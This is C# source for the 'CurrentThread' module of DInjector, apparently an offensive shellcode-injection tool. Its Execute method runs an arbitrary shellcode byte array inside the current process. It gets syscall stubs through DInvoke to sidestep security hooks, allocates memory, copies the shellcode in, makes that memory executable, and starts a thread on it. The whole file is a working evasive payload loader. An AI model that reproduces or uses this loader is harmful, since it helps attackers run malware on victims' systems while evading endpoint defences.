using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class CurrentThread
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWaitForSingleObject(
            IntPtr ObjectHandle,
            bool Alertable, uint Timeout);

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            #region NtAllocateVirtualMemory

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtAllocateVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
            }

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            #region NtProtectVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            uint oldProtect = 0;

            ntstatus = sysNtProtectVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtProtectVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtCreateThreadEx

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
            NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

            IntPtr hThread = IntPtr.Zero;

            ntstatus = sysNtCreateThreadEx(
                out hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                Process.GetCurrentProcess().Handle,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtCreateThreadEx");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtCreateThreadEx: {ntstatus}");
            }

            #endregion

            #region NtWaitForSingleObject

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
            NtWaitForSingleObject sysNtWaitForSingleObject = (NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWaitForSingleObject));

            ntstatus = sysNtWaitForSingleObject(
                hThread,
                false,
                0);

            if (ntstatus == 0)
            {
                Console.WriteLine("(Module) [+] NtWaitForSingleObject");
            }
            else
            {
                Console.WriteLine($"(Module) [-] NtWaitForSingleObject: {ntstatus}");
            }

            #endregion
        }
    }
}
